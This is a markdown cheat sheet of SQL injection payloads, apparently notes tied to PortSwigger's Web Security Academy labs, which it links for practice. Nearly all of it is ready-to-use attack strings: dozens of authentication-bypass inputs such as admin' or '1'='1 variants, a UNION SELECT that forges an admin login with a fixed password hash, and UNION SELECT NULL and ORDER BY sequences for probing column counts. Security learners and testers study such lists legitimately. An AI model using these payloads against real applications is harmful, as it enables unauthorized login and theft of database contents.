# Resources
[Learn about SQL injection](https://portswigger.net/web-security/sql-injection)

# Payloads

## Retriving hidden data
```sql
' or 1=1-- -
' or 1=1--
' --

```
[Practice this payload here](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

## Login bypassing
Note: Remember, sometimes you have to repleace 'admin' for another username. Here, 'admin' is just an example.
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
"-"
" "
"&"
"^"
"*"
'--'
"--"
'--' / "--"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 like 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin';-- azer 
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```
[How to bypass login authentication](https://portswigger.net/support/using-sql-injection-to-bypass-authentication)
[Practice this payload here](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

## Determining the number of columns returned by the query with UNION SELECT NULL-- -
```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
etc...
```
## Determining the number of columns returned by the query with UNION SELECT NULL--
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
etc...
```
## Determining the number of columns returned by the query with ORDER BY--
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
' ORDER BY 5--
' ORDER BY 6--
' ORDER BY 7--
' ORDER BY 8--
' ORDER BY 9--
' ORDER BY 10--
' ORDER BY 11--
' ORDER BY 12--
etc...
```
## Determining the number of columns returned by the query with ORDER BY-- -
```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
' ORDER BY 4-- -
' ORDER BY 5-- -
' ORDER BY 6-- -
' ORDER BY 7-- -
' ORDER BY 8-- -
' ORDER BY 9-- -
' ORDER BY 10-- -
' ORDER BY 11-- -
' ORDER BY 12-- -
etc...
```
[Practice this payload here](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)